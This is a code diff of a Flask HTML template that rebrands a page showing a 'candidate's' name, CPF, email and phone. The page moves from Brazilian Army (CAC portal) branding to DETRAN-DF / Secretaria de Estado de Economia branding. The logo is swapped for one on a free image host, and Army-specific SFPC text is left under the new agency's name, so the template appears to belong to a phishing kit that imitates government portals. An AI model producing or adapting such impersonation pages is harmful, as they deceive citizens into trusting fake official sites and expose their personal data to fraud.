@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal CAC - Dados do Usuário</title>
+    <title>Portal CAC - Dados do Candidato</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -20,13 +20,20 @@
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
         }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
     </style>
     <script>
         tailwind.config = {
             theme: {
                 extend: {
                     colors: {
-                        'custom-green': '#115E2F',
+                        'custom-blue': '#225BAC',
+                        'custom-yellow': '#F7CD04',
                     }
                 }
             }
@@ -38,22 +45,30 @@
     <div class="bg-white py-4">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://www.eb.mil.br/image/layout_set_logo?img_id=2784964&t=1674070423784" alt="Logo do Exército Brasileiro" class="h-16 mb-2" />
+                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
                 <div>
-                    <p class="text-black text-sm leading-tight font-bold">
-                        EXÉRCITO BRASILEIRO
+                    <p class="text-black text-[10px] leading-tight">
+                        SECRETARIA DE ESTADO DE ECONOMIA
                     </p>
-                    <p id="state-text" class="text-black text-sm leading-tight">
-                        Braço Forte - Mão Amiga
+                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
+                        DETRAN - Distrito Federal
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Title Bar -->
-    <div class="bg-custom-green py-3 shadow-md">
-        <div class="container mx-auto px-4 flex items-center justify-center">
+    <!-- Blue bar -->
+    <div class="bg-custom-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <button class="text-white text-2xl mr-4">
+                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-1.5 h-1.5 bg-white"></div>
+                </div>
+            </button>
             <span class="text-white text-xl drop-shadow-sm">DADOS DO CANDIDATO</span>
         </div>
     </div>
@@ -61,14 +76,14 @@
     <!-- Main Content -->
     <div class="container mx-auto px-4 py-6">
         <div class="max-w-2xl mx-auto">
-            <!-- Personal Information -->
-            <div class="bg-white rounded-lg shadow-md p-6 mb-4">
-                <h2 class="text-lg font-bold text-gray-800 mb-4">Informações do Candidato</h2>
-                <div class="space-y-4">
-                    <!-- Nome -->
+            <!-- Personal Data -->
+            <div class="bg-white rounded-lg shadow-md p-4 mb-4">
+                <h2 class="text-lg font-bold text-gray-800 mb-3">Dados do Candidato</h2>
+                <div class="space-y-3">
+                    <!-- Full width name field -->
                     <div class="border rounded-lg p-3">
                         <label class="block text-sm font-medium text-gray-600">Nome Completo</label>
-                        <p class="mt-1 text-gray-900 font-bold">{{ dados.name }}</p>
+                        <p class="mt-1 text-gray-900 font-bold truncate">{{ dados.name }}</p>
                     </div>
                     <!-- CPF -->
                     <div class="border rounded-lg p-3">
@@ -76,40 +91,44 @@
                         <p class="mt-1 text-gray-900 font-bold">{{ dados.cpf }}</p>
                     </div>
                 </div>
+            </div>
 
-                <div class="mt-6">
-                    <h3 class="text-md font-bold text-gray-800 mb-3">Dados de Contato</h3>
-                    <div class="space-y-4">
-                        <!-- Email -->
-                        <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">E-mail</label>
-                            <p class="mt-1 text-gray-900">{{ dados.email }}</p>
-                        </div>
-                        <!-- Telefone -->
-                        <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">Telefone</label>
-                            <p class="mt-1 text-gray-900">{{ dados.phone }}</p>
-                        </div>
+            <!-- Contact Data -->
+            <div class="bg-white rounded-lg shadow-md p-4 mb-4">
+                <h2 class="text-lg font-bold text-gray-800 mb-3">Dados de Contato</h2>
+                <div class="space-y-3">
+                    <div class="border rounded-lg p-3">
+                        <label class="block text-sm font-medium text-gray-600">Email</label>
+                        <p class="mt-1 text-gray-900 font-bold">{{ dados.email }}</p>
+                    </div>
+                    <div class="border rounded-lg p-3">
+                        <label class="block text-sm font-medium text-gray-600">Telefone</label>
+                        <p class="mt-1 text-gray-900 font-bold">{{ dados.phone }}</p>
+                    </div>
+                </div>
+
+                <div class="mt-3 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-triangle text-yellow-600 mr-2"></i>
+                        <span class="text-sm text-yellow-800">
+                            Verifique se seus dados estão corretos. Em caso de divergências, entre em contato com a Seção de Fiscalização de Produtos Controlados (SFPC) da sua região.
+                        </span>
                     </div>
                 </div>
             </div>
 
-            <!-- Action Buttons -->
-            <div class="bg-white rounded-lg shadow-md p-6">
-                <div class="text-center text-sm text-gray-600 mb-4">
-                    <p>Verifique se seus dados estão corretos antes de prosseguir.</p>
-                    <p>Em caso de divergências, entre em contato com a Seção de Fiscalização de Produtos Controlados (SFPC) da sua região.</p>
-                </div>
-                <button onclick="window.location.href = '/'" class="bg-custom-green text-white font-bold py-3 px-4 rounded w-full hover:bg-opacity-90 transition-colors">
-                    Voltar ao Início
+            <div class="bg-white rounded-lg shadow-md p-4">
+                <button onclick="window.location.href = '/'" class="bg-custom-blue text-white font-bold py-3 px-4 rounded w-full hover:bg-opacity-90 transition-colors flex items-center justify-center">
+                    <span>Voltar ao Início</span>
+                    <i class="fas fa-arrow-left ml-2"></i>
                 </button>
             </div>
         </div>
     </div>
 
     <!-- Footer -->
-    <div class="bg-custom-green text-white text-center py-3 mt-auto">
-        <p class="text-sm">© {{ current_year }} Exército Brasileiro. Todos os direitos reservados.</p>
+    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
+        <p class="text-sm">© {{ current_year }} Secretaria de Estado de Economia. Todos os direitos reservados.</p>
     </div>
 </body>
 </html>
